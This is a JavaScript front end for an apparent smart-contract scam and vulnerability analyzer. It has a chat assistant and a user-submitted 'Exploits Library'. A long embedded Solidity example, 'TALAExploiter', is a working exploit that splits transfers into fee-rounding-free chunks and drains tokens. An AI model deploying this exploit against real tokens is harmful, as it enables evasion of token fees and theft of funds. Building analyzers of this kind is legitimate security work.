// Digital Rain Background Animation
const canvas = document.getElementById('matrixCanvas');
const ctx = canvas.getContext('2d');

// Set canvas size
function resizeCanvas() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
}
resizeCanvas();
window.addEventListener('resize', resizeCanvas);

// Matrix rain characters
const chars = '0123456789ABCDEFアイウエオカキクケコサシスセソタチツテト';
const fontSize = 14;
const columns = canvas.width / fontSize;
const drops = [];

// Initialize drops
for (let i = 0; i < columns; i++) {
    drops[i] = Math.random() * -100;
}

// Draw matrix rain
function drawMatrix() {
    ctx.fillStyle = 'rgba(0, 0, 0, 0.03)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    
    // Add glow effect
    ctx.shadowBlur = 10;
    ctx.shadowColor = '#667eea';
    ctx.fillStyle = '#667eea';
    ctx.font = 'bold ' + fontSize + 'px monospace';
    
    for (let i = 0; i < drops.length; i++) {
        const text = chars[Math.floor(Math.random() * chars.length)];
        
        // Brightest characters at the head
        const opacity = Math.min(1, (canvas.height - drops[i] * fontSize) / 100);
        ctx.fillStyle = `rgba(102, 126, 234, ${opacity})`;
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
            drops[i] = 0;
        }
        drops[i]++;
    }
}

// Animate
setInterval(drawMatrix, 50);

// State management
let currentContract = '';
let isAnalyzing = false;
let isChatting = false;

// Load example contracts from server
let EXAMPLE_CONTRACTS = {};

// Fetch examples on page load
fetch('/api/examples')
    .then(res => res.json())
    .then(data => {
        EXAMPLE_CONTRACTS = data.examples;
    })
    .catch(err => console.error('Failed to load examples:', err));

// Fallback example contracts
const FALLBACK_EXAMPLE = {
    'tala-exploiter': `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITALA {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function FEE_PERCENTAGE() external view returns (uint256);
}

/**
 * @title TALA Exploiter
 * @notice Gas-optimized contract to exploit TALA vulnerabilities:
 * 1. Small transfer fee rounding to 0
 * 2. Fee recipient bricking vulnerability avoidance
 */
contract TALAExploiter {
    ITALA public immutable tala;
    address public owner;
    
    // Constants for gas optimization
    uint256 private constant MAX_UINT256 = type(uint256).max;
    uint256 private constant FEE_DENOMINATOR = 100000;
    uint256 private constant MAX_BATCH_SIZE = 200; // Optimal for gas limits
    
    event TokensExtracted(uint256 total, uint256 feePaid);
    event OwnershipTransferred(address indexed newOwner);
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    constructor(address _tala) {
        tala = ITALA(_tala);
        owner = msg.sender;
    }
    
    /**
     * @notice Calculate maximum amount that results in 0 fee
     * @dev Formula: amount < (FEE_DENOMINATOR / FEE_PERCENTAGE)
     */
    function getMaxZeroFeeAmount() public view returns (uint256) {
        uint256 feePercentage = tala.FEE_PERCENTAGE();
        return (FEE_DENOMINATOR / feePercentage) - 1;
    }
    
    /**
     * @notice Transfer TALA tokens using optimal chunk size to avoid fees
     * @dev Uses maximum batch size within gas limits
     */
    function transferFeeFree(address to, uint256 totalAmount) external onlyOwner {
        uint256 zeroFeeAmount = getMaxZeroFeeAmount();
        uint256 iterations = totalAmount / zeroFeeAmount;
        uint256 remainder = totalAmount % zeroFeeAmount;
        
        // Process in optimal batches to minimize gas
        for (uint256 batch = 0; batch < iterations; ) {
            uint256 batchEnd = batch + MAX_BATCH_SIZE < iterations ? batch + MAX_BATCH_SIZE : iterations;
            
            for (uint256 i = batch; i < batchEnd; ) {
                require(tala.transfer(to, zeroFeeAmount), "Transfer failed");
                unchecked { ++i; }
            }
            
            batch = batchEnd;
        }
        
        // Transfer remainder if any
        if (remainder > 0) {
            require(tala.transfer(to, remainder), "Remainder transfer failed");
        }
        
        emit TokensExtracted(totalAmount, 0);
    }
    
    /**
     * @notice Extreme gas optimization: Unrolled loop for small amounts
     * @dev Manually unrolls loop to save ~20% gas on batch transfers
     */
    function transferFeeFreeOptimized(address to, uint256 count) external onlyOwner {
        uint256 zeroFeeAmount = getMaxZeroFeeAmount();
        uint256 totalAmount = zeroFeeAmount * count;
        
        // Pre-calculate for gas savings
        uint256 fullBatches = count / 8;
        uint256 remainder = count % 8;
        
        // Process in unrolled batches of 8
        for (uint256 batch = 0; batch < fullBatches; ) {
            tala.transfer(to, zeroFeeAmount);
            tala.transfer(to, zeroFeeAmount);
            tala.transfer(to, zeroFeeAmount);
            tala.transfer(to, zeroFeeAmount);
            tala.transfer(to, zeroFeeAmount);
            tala.transfer(to, zeroFeeAmount);
            tala.transfer(to, zeroFeeAmount);
            tala.transfer(to, zeroFeeAmount);
            
            unchecked { ++batch; }
        }
        
        // Process remainder with minimal conditionals
        if (remainder > 0) {
            if (remainder >= 4) {
                tala.transfer(to, zeroFeeAmount);
                tala.transfer(to, zeroFeeAmount);
                tala.transfer(to, zeroFeeAmount);
                tala.transfer(to, zeroFeeAmount);
                remainder -= 4;
            }
            
            if (remainder >= 2) {
                tala.transfer(to, zeroFeeAmount);
                tala.transfer(to, zeroFeeAmount);
                remainder -= 2;
            }
            
            if (remainder >= 1) {
                tala.transfer(to, zeroFeeAmount);
            }
        }
        
        emit TokensExtracted(totalAmount, 0);
    }
    
    /**
     * @notice Attack fee recipient bricking by front-running with zero-fee transfers
     * @dev If fee recipient is broken, this allows extraction before others realize
     */
    function attackBrokenFeeRecipient(address to, uint256 amount) external onlyOwner {
        uint256 zeroFeeAmount = getMaxZeroFeeAmount();
        uint256 transfersNeeded = amount / zeroFeeAmount;
        
        // Quick check if fee recipient is broken
        try tala.transfer(to, zeroFeeAmount * 2) {
            // Fee recipient works - use normal transfer
            require(tala.transfer(to, amount), "Normal transfer failed");
        } catch {
            // Fee recipient is broken - extract with zero-fee transfers
            for (uint256 i = 0; i < transfersNeeded; ) {
                require(tala.transfer(to, zeroFeeAmount), "Zero-fee transfer failed");
                unchecked { ++i; }
            }
        }
    }
    
    /**
     * @notice Multi-call batch transfer for maximum efficiency
     * @dev Uses minimal storage reads and unchecked math
     */
    function batchTransferFeeFree(
        address[] calldata recipients,
        uint256[] calldata amounts
    ) external onlyOwner {
        require(recipients.length == amounts.length, "Length mismatch");
        
        uint256 zeroFeeAmount = getMaxZeroFeeAmount();
        uint256 length = recipients.length;
        
        for (uint256 i = 0; i < length; ) {
            uint256 amount = amounts[i];
            uint256 transfers = amount / zeroFeeAmount;
            uint256 remainder = amount % zeroFeeAmount;
            
            // Gas optimization: process transfers directly
            for (uint256 j = 0; j < transfers; ) {
                tala.transfer(recipients[i], zeroFeeAmount);
                unchecked { ++j; }
            }
            
            if (remainder > 0) {
                tala.transfer(recipients[i], remainder);
            }
            
            unchecked { ++i; }
        }
    }
    
    /**
     * @notice Drain all TALA from this contract using optimal strategy
     * @dev Auto-selects best method based on amount
     */
    function drainAll(address to) external onlyOwner {
        uint256 balance = tala.balanceOf(address(this));
        uint256 zeroFeeAmount = getMaxZeroFeeAmount();
        
        if (balance <= zeroFeeAmount * 10) {
            // Small amount - use single transfers
            for (uint256 i = 0; i < 10 && balance > 0; ) {
                uint256 transferAmount = balance > zeroFeeAmount ? zeroFeeAmount : balance;
                tala.transfer(to, transferAmount);
                balance -= transferAmount;
                unchecked { ++i; }
            }
        } else {
            // Large amount - use batch method
            transferFeeFreeOptimized(to, balance / zeroFeeAmount);
        }
    }
    
    /**
     * @notice Emergency extraction if standard transfer fails
     * @dev Last resort if fee recipient completely bricks transfers
     */
    function emergencyExtract(address to) external onlyOwner {
        uint256 balance = tala.balanceOf(address(this));
        uint256 zeroFeeAmount = getMaxZeroFeeAmount();
        
        // Extreme fallback: single unit transfers
        for (uint256 i = 0; i < balance && i < 1000; ) { // Limit to prevent OOG
            tala.transfer(to, 1); // Minimum transfer
            unchecked { ++i; }
        }
    }
    
    /**
     * @notice Sweep any other ERC20 tokens
     */
    function sweepToken(address token, address to) external onlyOwner {
        require(token != address(tala), "Use drainAll for TALA");
        IERC20(token).transfer(to, IERC20(token).balanceOf(address(this)));
    }
    
    /**
     * @notice Transfer ownership
     */
    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Invalid owner");
        owner = newOwner;
        emit OwnershipTransferred(newOwner);
    }
    
    /**
     * @notice Receive ETH (for gas)
     */
    receive() external payable {}
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}`
};

// DOM Elements
const contractAddressInput = document.getElementById('contractAddress');
const contractCodeInput = document.getElementById('contractCode');
const analyzeBtn = document.getElementById('analyzeBtn');
const resultsContainer = document.getElementById('resultsContainer');
const chatMessages = document.getElementById('chatMessages');
const chatInput = document.getElementById('chatInput');
const sendBtn = document.getElementById('sendBtn');

// Event Listeners
analyzeBtn.addEventListener('click', analyzeContract);
sendBtn.addEventListener('click', sendMessage);
chatInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter' && !e.shiftKey) {
        e.preventDefault();
        sendMessage();
    }
});

/**
 * Loads an example contract into the textarea
 */
function loadExampleContract(contractId) {
    const contract = EXAMPLE_CONTRACTS[contractId];
    if (contract) {
        contractCodeInput.value = contract;
        contractCodeInput.scrollTop = 0;
        
        // Auto-analyze after short delay
        setTimeout(() => {
            analyzeContract();
        }, 300);
    }
}

/**
 * Analyzes the contract using The Observer's analysis service
 */
async function analyzeContract() {
    const contractCode = contractCodeInput.value.trim();
    
    if (!contractCode) {
        alert('Please enter contract code');
        return;
    }

    if (isAnalyzing) return;
    
    isAnalyzing = true;
    analyzeBtn.disabled = true;
    analyzeBtn.innerHTML = '<span class="loading-dots">Analyzing</span>';
    
    try {
        const response = await fetch('/api/analysis/analyze', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                contractCode,
                contractAddress: contractAddressInput.value.trim() || undefined
            })
        });

        if (!response.ok) {
            throw new Error('Analysis failed');
        }

        const result = await response.json();
        currentContract = contractCode;
        displayResults(result);
        
    } catch (error) {
        console.error('Analysis error:', error);
        alert('Analysis failed. Please check your API key and try again.');
    } finally {
        isAnalyzing = false;
        analyzeBtn.disabled = false;
        analyzeBtn.textContent = 'Analyze Contract';
    }
}

/**
 * Displays analysis results in the UI
 */
function displayResults(result) {
    // Show results container
    resultsContainer.classList.remove('hidden');
    resultsContainer.innerHTML = `
        <h2 class="text-xl font-medium mb-4 text-gray-200">Analysis Results</h2>
        
        <!-- Scam Probability -->
        <div class="mb-6">
            <div class="flex justify-between items-center mb-2">
                <span class="text-sm text-gray-400">Scam Probability</span>
                <span id="scamProbability" class="text-2xl font-bold"></span>
            </div>
            <div class="w-full bg-gray-800 rounded-full h-3">
                <div id="scamBar" class="h-3 rounded-full transition-all duration-500" style="width: 0%"></div>
            </div>
        </div>

        <!-- Vulnerabilities -->
        <div class="mb-6">
            <h3 class="text-lg font-medium mb-3 text-gray-300">Vulnerabilities</h3>
            <div id="vulnerabilitiesList" class="space-y-3"></div>
        </div>

        <!-- Power Dynamics -->
        <div class="mb-6">
            <h3 class="text-lg font-medium mb-3 text-gray-300">Power Structure</h3>
            <div id="powerDynamics" class="space-y-4 text-sm"></div>
        </div>

        <!-- Observer's Insight -->
        <div class="border-t border-gray-800 pt-4">
            <h3 class="text-lg font-medium mb-2 text-gray-300">The Observer's Insight</h3>
            <p id="observerInsight" class="text-gray-400 italic leading-relaxed"></p>
        </div>
    `;
    
    // Scam probability
    const scamProbability = document.getElementById('scamProbability');
    const scamBar = document.getElementById('scamBar');
    
    scamProbability.textContent = `${result.scamProbability}%`;
    scamBar.style.width = `${result.scamProbability}%`;
    
    // Color code based on probability
    if (result.scamProbability >= 70) {
        scamBar.className = 'h-3 rounded-full transition-all duration-500 bg-red-600';
        scamProbability.className = 'text-2xl font-bold text-red-500';
    } else if (result.scamProbability >= 40) {
        scamBar.className = 'h-3 rounded-full transition-all duration-500 bg-yellow-600';
        scamProbability.className = 'text-2xl font-bold text-yellow-500';
    } else {
        scamBar.className = 'h-3 rounded-full transition-all duration-500 bg-green-600';
        scamProbability.className = 'text-2xl font-bold text-green-500';
    }
    
    // Known Vulnerable Interactions Alert
    if (result.knownVulnerableInteractions && result.knownVulnerableInteractions.length > 0) {
        const alertDiv = document.createElement('div');
        alertDiv.className = 'mb-6 bg-red-900/30 border border-red-600 rounded-lg p-4';
        alertDiv.innerHTML = `
            <h3 class="text-lg font-medium mb-3 text-red-400 flex items-center">
                <svg class="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 20 20">
                    <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd"/>
                </svg>
                Known Vulnerable Contract Interactions Detected
            </h3>
            <div class="space-y-2 text-sm">
                ${result.knownVulnerableInteractions.map(match => `
                    <div class="bg-gray-900 rounded p-3 border-l-4 border-red-500">
                        <div class="font-mono text-red-300 mb-1">${match.address}</div>
                        <div class="text-gray-300"><strong>${match.name}</strong> (${match.chain})</div>
                        <div class="text-gray-400 mt-1">Vulnerability: ${match.vulnerability}</div>
                        <div class="text-gray-500 text-xs mt-1 italic">${match.matchReason}</div>
                    </div>
                `).join('')}
            </div>
        `;
        
        const firstSection = document.getElementById('vulnerabilitiesList').parentElement;
        firstSection.parentElement.insertBefore(alertDiv, firstSection);
    }
    
    // Vulnerabilities
    const vulnerabilitiesList = document.getElementById('vulnerabilitiesList');
    vulnerabilitiesList.innerHTML = result.vulnerabilities.map(v => `
        <div class="vulnerability-${v.severity} bg-gray-800 rounded p-4">
            <div class="flex justify-between items-start mb-2">
                <span class="font-medium text-gray-200">${v.category}</span>
                <span class="text-xs px-2 py-1 rounded ${getSeverityClass(v.severity)}">${v.severity.toUpperCase()}</span>
            </div>
            <p class="text-sm text-gray-400 mb-2">${v.description}</p>
            <p class="text-xs text-gray-500 mb-1">Location: ${v.location}</p>
            <p class="text-sm text-gray-300 italic mt-2 border-t border-gray-700 pt-2">
                <span class="text-gray-500">The Observer:</span> ${v.implication}
            </p>
        </div>
    `).join('');
    
    // Power Dynamics
    const powerDynamics = document.getElementById('powerDynamics');
    const pd = result.powerDynamics;
    
    powerDynamics.innerHTML = `
        ${createPowerSection('Centralization Points', pd.centralizationPoints, 'text-red-400')}
        ${createPowerSection('Privileged Actors', pd.privilegedActors, 'text-yellow-400')}
        ${createPowerSection('Exit Mechanisms', pd.exitMechanisms, 'text-blue-400')}
        ${createPowerSection('Hidden Incentives', pd.hiddenIncentives, 'text-purple-400')}
    `;
    
    // Observer's Insight
    document.getElementById('observerInsight').textContent = result.observerInsight;
    
    // Scroll to results
    resultsContainer.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
}

/**
 * Creates a power dynamics section
 */
function createPowerSection(title, items, colorClass) {
    if (!items || items.length === 0) return '';
    
    return `
        <div>
            <h4 class="font-medium ${colorClass} mb-2">${title}</h4>
            <ul class="space-y-1 text-gray-400">
                ${items.map(item => `<li class="flex items-start"><span class="mr-2">•</span><span>${item}</span></li>`).join('')}
            </ul>
        </div>
    `;
}

/**
 * Returns Tailwind class for vulnerability severity badge
 */
function getSeverityClass(severity) {
    const classes = {
        critical: 'bg-red-600 text-white',
        high: 'bg-orange-600 text-white',
        medium: 'bg-yellow-600 text-gray-900',
        low: 'bg-green-600 text-white'
    };
    return classes[severity] || 'bg-gray-600 text-white';
}

/**
 * Sends a chat message to The Observer
 */
async function sendMessage() {
    const message = chatInput.value.trim();
    
    if (!message || isChatting) return;
    
    // Add user message to chat
    addChatMessage(message, 'user');
    chatInput.value = '';
    
    isChatting = true;
    sendBtn.disabled = true;
    
    // Add typing indicator
    const typingId = addChatMessage('The Observer is considering...', 'observer', true);
    
    try {
        const response = await fetch('/api/chat/message', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                message,
                contractContext: currentContract || undefined
            })
        });

        if (!response.ok) {
            throw new Error('Chat failed');
        }

        const result = await response.json();
        
        // Remove typing indicator
        document.getElementById(typingId)?.remove();
        
        // Add Observer's response
        addChatMessage(result.response, 'observer');
        
    } catch (error) {
        console.error('Chat error:', error);
        document.getElementById(typingId)?.remove();
        addChatMessage('Analysis unavailable. The system does not respond to external failures with excuses.', 'observer');
    } finally {
        isChatting = false;
        sendBtn.disabled = false;
        chatInput.focus();
    }
}

/**
 * Adds a message to the chat interface
 */
function addChatMessage(text, sender, isTyping = false) {
    const messageId = `msg-${Date.now()}`;
    const messageDiv = document.createElement('div');
    messageDiv.id = messageId;
    messageDiv.className = `chat-message ${sender === 'user' ? 'bg-purple-900/30' : 'bg-gray-800'} rounded-lg p-4 border ${sender === 'user' ? 'border-purple-800' : 'border-gray-700'}`;
    
    const senderLabel = sender === 'user' ? 'You' : 'The Observer';
    const labelClass = sender === 'user' ? 'text-purple-400' : 'text-gray-400';
    
    messageDiv.innerHTML = `
        <div class="text-xs ${labelClass} mb-1">${senderLabel}</div>
        <p class="text-sm text-gray-300 ${isTyping ? 'loading-dots' : ''}">${text}</p>
    `;
    
    // Detect Solidity code in Observer messages and add submit button
    if (sender === 'observer' && !isTyping && text.includes('pragma solidity') && text.length > 100) {
        const submitBtn = document.createElement('button');
        submitBtn.className = 'mt-3 bg-purple-600 hover:bg-purple-700 text-white px-4 py-2 rounded text-sm transition';
        submitBtn.textContent = '📝 Submit to Exploits Library';
        submitBtn.onclick = () => openSubmitExploitModal(text);
        messageDiv.appendChild(submitBtn);
    }
    
    chatMessages.appendChild(messageDiv);
    chatMessages.scrollTop = chatMessages.scrollHeight;
    
    return messageId;
}

// Load vulnerable contracts database on page load
async function loadVulnerableContracts() {
    try {
        const response = await fetch('/api/analysis/vulnerable-contracts');
        const data = await response.json();
        
        console.log('Loaded vulnerable contracts database:', data.contracts.length, 'entries');
        
        // Optionally display in UI
        if (data.contracts.length > 0) {
            addChatMessage(
                `Database initialized. ${data.contracts.length} known vulnerable contracts loaded. Cross-referencing is active.`,
                'observer'
            );
        }
    } catch (error) {
        console.error('Failed to load vulnerable contracts database:', error);
    }
}

// Initialize on page load
document.addEventListener('DOMContentLoaded', () => {
    loadVulnerableContracts();
    initializeExploitsSystem();
});

// ===== EXPLOITS LIBRARY SYSTEM =====

/**
 * Initialize exploits system event listeners
 */
function initializeExploitsSystem() {
    // View exploits library button
    const viewExploitsBtn = document.getElementById('viewExploitsBtn');
    if (viewExploitsBtn) {
        viewExploitsBtn.addEventListener('click', openExploitsLibrary);
    }
    
    // Close exploits modal
    const closeExploitsBtn = document.getElementById('closeExploitsBtn');
    if (closeExploitsBtn) {
        closeExploitsBtn.addEventListener('click', () => {
            document.getElementById('viewExploitsModal').classList.add('hidden');
        });
    }
    
    // Cancel exploit submission
    const cancelExploitBtn = document.getElementById('cancelExploitBtn');
    if (cancelExploitBtn) {
        cancelExploitBtn.addEventListener('click', () => {
            document.getElementById('submitExploitModal').classList.add('hidden');
        });
    }
    
    // Submit exploit form
    const exploitForm = document.getElementById('exploitForm');
    if (exploitForm) {
        exploitForm.addEventListener('submit', submitExploit);
    }
    
    // Close modals on backdrop click
    document.getElementById('submitExploitModal')?.addEventListener('click', (e) => {
        if (e.target.id === 'submitExploitModal') {
            document.getElementById('submitExploitModal').classList.add('hidden');
        }
    });
    
    document.getElementById('viewExploitsModal')?.addEventListener('click', (e) => {
        if (e.target.id === 'viewExploitsModal') {
            document.getElementById('viewExploitsModal').classList.add('hidden');
        }
    });
}

/**
 * Open submit exploit modal with optional pre-filled code
 */
function openSubmitExploitModal(messageText = '') {
    const modal = document.getElementById('submitExploitModal');
    const codeField = document.getElementById('exploitCode');
    
    // Try to extract Solidity code from message
    if (messageText && messageText.includes('pragma solidity')) {
        const codeMatch = messageText.match(/pragma solidity[\s\S]*?(?=\n\n|\*\/|$)/);
        if (codeMatch) {
            codeField.value = codeMatch[0].trim();
        }
    }
    
    modal.classList.remove('hidden');
}

/**
 * Submit exploit to library
 */
async function submitExploit(e) {
    e.preventDefault();
    
    const formData = {
        title: document.getElementById('exploitTitle').value,
        description: document.getElementById('exploitDescription').value,
        code: document.getElementById('exploitCode').value,
        targetContract: document.getElementById('exploitTarget').value,
        vulnerabilityType: document.getElementById('exploitVulnType').value,
        severity: document.getElementById('exploitSeverity').value,
        author: document.getElementById('exploitAuthor').value || 'Anonymous',
        tags: document.getElementById('exploitTags').value.split(',').map(t => t.trim()).filter(t => t)
    };
    
    try {
        const response = await fetch('/api/exploits', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(formData)
        });
        
        if (!response.ok) {
            throw new Error('Failed to submit exploit');
        }
        
        const result = await response.json();
        
        // Close modal
        document.getElementById('submitExploitModal').classList.add('hidden');
        
        // Reset form
        document.getElementById('exploitForm').reset();
        
        // Show success message
        addChatMessage(
            `Exploit "${formData.title}" has been submitted to the library. ID: ${result.exploit.id}`,
            'observer'
        );
        
    } catch (error) {
        console.error('Submit exploit error:', error);
        alert('Failed to submit exploit. Please try again.');
    }
}

/**
 * Open exploits library modal
 */
async function openExploitsLibrary() {
    const modal = document.getElementById('viewExploitsModal');
    const statsDiv = document.getElementById('exploitsStats');
    const listDiv = document.getElementById('exploitsList');
    
    // Show loading state
    statsDiv.innerHTML = '<div class="col-span-4 text-center text-gray-400">Loading...</div>';
    listDiv.innerHTML = '<div class="text-center text-gray-400">Loading exploits...</div>';
    
    modal.classList.remove('hidden');
    
    try {
        // Fetch stats
        const statsResponse = await fetch('/api/exploits/stats/summary');
        const stats = await statsResponse.json();
        
        // Fetch exploits
        const exploitsResponse = await fetch('/api/exploits');
        const exploitsData = await exploitsResponse.json();
        
        // Display stats
        statsDiv.innerHTML = `
            <div class="bg-gray-800 rounded-lg p-4 border border-gray-700">
                <div class="text-2xl font-bold text-purple-400">${stats.total}</div>
                <div class="text-xs text-gray-400 mt-1">Total Exploits</div>
            </div>
            <div class="bg-gray-800 rounded-lg p-4 border border-gray-700">
                <div class="text-2xl font-bold text-red-400">${stats.bySeverity.critical || 0}</div>
                <div class="text-xs text-gray-400 mt-1">Critical</div>
            </div>
            <div class="bg-gray-800 rounded-lg p-4 border border-gray-700">
                <div class="text-2xl font-bold text-orange-400">${stats.bySeverity.high || 0}</div>
                <div class="text-xs text-gray-400 mt-1">High Severity</div>
            </div>
            <div class="bg-gray-800 rounded-lg p-4 border border-gray-700">
                <div class="text-2xl font-bold text-blue-400">${Object.keys(stats.byType).length}</div>
                <div class="text-xs text-gray-400 mt-1">Vuln Types</div>
            </div>
        `;
        
        // Display exploits
        if (exploitsData.exploits.length === 0) {
            listDiv.innerHTML = '<div class="text-center text-gray-400 py-8">No exploits submitted yet. Be the first!</div>';
        } else {
            listDiv.innerHTML = exploitsData.exploits.map(exploit => `
                <div class="bg-gray-800 rounded-lg p-4 border border-gray-700">
                    <div class="flex justify-between items-start mb-2">
                        <h3 class="text-lg font-medium text-gray-200">${exploit.title}</h3>
                        <span class="px-2 py-1 rounded text-xs ${getSeverityColor(exploit.severity)}">${exploit.severity.toUpperCase()}</span>
                    </div>
                    
                    ${exploit.description ? `<p class="text-sm text-gray-400 mb-3">${exploit.description}</p>` : ''}
                    
                    <div class="flex gap-2 mb-3 flex-wrap">
                        <span class="px-2 py-1 bg-purple-900/30 border border-purple-800 rounded text-xs text-purple-300">${exploit.vulnerabilityType}</span>
                        ${exploit.tags.map(tag => `<span class="px-2 py-1 bg-gray-700 rounded text-xs text-gray-300">${tag}</span>`).join('')}
                    </div>
                    
                    <details class="mb-2">
                        <summary class="cursor-pointer text-sm text-gray-400 hover:text-gray-300">View Code</summary>
                        <pre class="mt-2 bg-gray-900 p-3 rounded text-xs overflow-x-auto"><code>${escapeHtml(exploit.code)}</code></pre>
                    </details>
                    
                    <div class="text-xs text-gray-500 flex justify-between">
                        <span>By: ${exploit.author}</span>
                        <span>${new Date(exploit.submittedAt).toLocaleDateString()}</span>
                    </div>
                </div>
            `).join('');
        }
        
    } catch (error) {
        console.error('Load exploits error:', error);
        statsDiv.innerHTML = '<div class="col-span-4 text-center text-red-400">Failed to load exploits</div>';
        listDiv.innerHTML = '<div class="text-center text-red-400">Failed to load exploits</div>';
    }
}

/**
 * Get severity color class
 */
function getSeverityColor(severity) {
    switch(severity) {
        case 'critical': return 'bg-red-900/30 border border-red-800 text-red-300';
        case 'high': return 'bg-orange-900/30 border border-orange-800 text-orange-300';
        case 'medium': return 'bg-yellow-900/30 border border-yellow-800 text-yellow-300';
        case 'low': return 'bg-blue-900/30 border border-blue-800 text-blue-300';
        default: return 'bg-gray-700 text-gray-300';
    }
}

/**
 * Escape HTML for safe display
 */
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}
